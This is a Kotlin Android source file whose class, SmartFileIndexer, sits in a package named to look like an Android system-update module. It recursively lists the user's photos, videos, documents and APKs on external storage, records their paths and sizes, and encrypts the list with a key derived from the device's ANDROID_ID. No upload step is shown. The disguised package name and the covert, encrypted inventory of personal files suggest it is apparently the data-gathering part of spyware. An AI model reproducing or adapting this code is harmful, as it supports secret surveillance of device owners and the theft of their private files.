package com.android.system.update.modules.storage

import android.content.Context
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import java.io.File
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SmartFileIndexer(private val context: Context) {

    private val random = SecureRandom()
    private val deviceKey: ByteArray

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun scanAndIndex(): String {
        val roots = mutableListOf<File>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            context.getExternalFilesDirs(null)?.forEach { roots.add(it) }
        } else {
            Environment.getExternalStorageDirectory()?.let { roots.add(it) }
        }
        roots.add(context.filesDir)
        roots.add(context.cacheDir)

        val index = mutableListOf<Map<String, String>>()
        for (root in roots) {
            if (root.exists()) {
                scanDirectory(root, index)
            }
        }
        val json = index.joinToString("|") { "${it["path"]}|${it["type"]}|${it["size"]}" }
        return encrypt(json)
    }

    private fun scanDirectory(dir: File, list: MutableList<Map<String, String>>) {
        val files = dir.listFiles() ?: return
        for (file in files) {
            if (file.isDirectory) {
                scanDirectory(file, list)
            } else {
                val ext = file.extension.lowercase()
                val type = when (ext) {
                    "jpg", "jpeg", "png", "gif", "bmp" -> "image"
                    "mp4", "avi", "mkv", "mov", "flv" -> "video"
                    "pdf", "doc", "docx", "xls", "xlsx", "txt" -> "document"
                    "apk" -> "apk"
                    else -> "other"
                }
                if (type != "other") {
                    list.add(mapOf(
                        "path" to file.absolutePath,
                        "type" to type,
                        "size" to file.length().toString()
                    ))
                }
            }
        }
    }

    private fun encrypt(data: String): String {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data.toByteArray())
        val combined = iv + encrypted
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }
}